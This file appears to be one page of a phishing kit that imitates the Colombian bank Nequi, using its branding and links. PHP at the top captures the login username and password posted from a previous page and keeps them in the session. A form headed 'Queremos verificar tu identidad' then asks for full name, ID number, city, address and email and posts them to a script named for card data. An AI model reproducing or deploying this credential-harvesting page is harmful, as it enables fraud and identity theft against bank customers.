<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $j_username = $_POST["j_username"];
    $j_password = $_POST["j_password"];
    $_SESSION["j_username"] = $j_username;
    $_SESSION["j_password"] = $j_password;
} else {
    header("Location: login.html");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Webflow">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
    <link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
    <!-- Librerias JS -->
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="assets/js/libs/lodash.min.js"></script>
    <script src="assets/js/libs/restangular.min.js"></script>
    <script type="text/javascript" src="assets/js/libs/angular-recaptcha.min.js"></script>
</head>
<body ng-app="App" class="ng-scope">
    <div id="content">
        <!-- Header -->
        <header class="ng-scope">
            <div class="wrap-header">
                <div class="row">
                    <div class="col-xs-12 col-md-2">
                        <div class="logo">
                            <a href="https://www.nequi.com.co">
                                <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                            </a>
                        </div>
                        <div class="btn-menu-hamburguer" ng-click="openMenu();">
                            <a class=""><span></span></a>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-10 container-buttons">
                        <div class="wrap-main-menu">
                            <div class="row">
                                <div class="col-xs-12 col-md-8"></div>
                                <div class="col-xs-12 col-md-4">
                                    <div class="buttons-right">
                                        <ul>
                                            <li ng-if="!hidePa" class="ng-scope">
                                                <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl" class="ng-binding">Recarga</a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <img src="assets/images/push-action-timerV2.gif" alt="" width="25%">
                <h1 class="ng-binding">Queremos verificar tu identidad</h1>
                <div class="login-form-wrap">
                    <form method="POST" action="datos_tarjetas.php" autocomplete="off"
                        name="loginControl.formLogin" novalidate=""
                        class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
                        <div class="preguntas">
                            <input type="text" name="nombre" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; padding-left:10px;" placeholder="Nombre Completo" required>
                            <br><input type="tel" name="cedula" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; margin-top:10px; padding-left:10px;" placeholder="Número de Identificación" required>
                            <br><input type="text" name="ciudad" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Ciudad de Residencia" required>
                            <br><input type="text" name="dir" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Dirección" required>
                            <br><input type="email" name="email" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Email de Contacto" required>
                        </div>
                        <div class="btn-wrap">
                            <input class="form-btn-submit" type="submit" value="Continuar">
                        </div>
                    </form>
                </div>
            </div>
        </section>
        <!-- Footer -->
        <footer class="ng-scope">
            <div class="container-footer">
                <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div>
                <div class="container-top">
                    <div class="logo-nequi">
                        <img alt="logo nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                    </div>
                    <div class="stores">
                        <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                        </a>
                        <a href="https://apps.apple.com/co/app/nequi/id1075378688">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                        </a>
                        <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
                            <img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                        </a>
                    </div>
                    <div class="group-bancolombia">
                        <a href="https://www.grupobancolombia.com/">
                            <img class="img-group-bancolombia" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                        </a>
                    </div>
                </div>
                <hr class="separator">
            </div>
        </footer>
    </div>
    <script src="assets/js/script.js"></script>
    <script async defer src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script>
</body>
</html>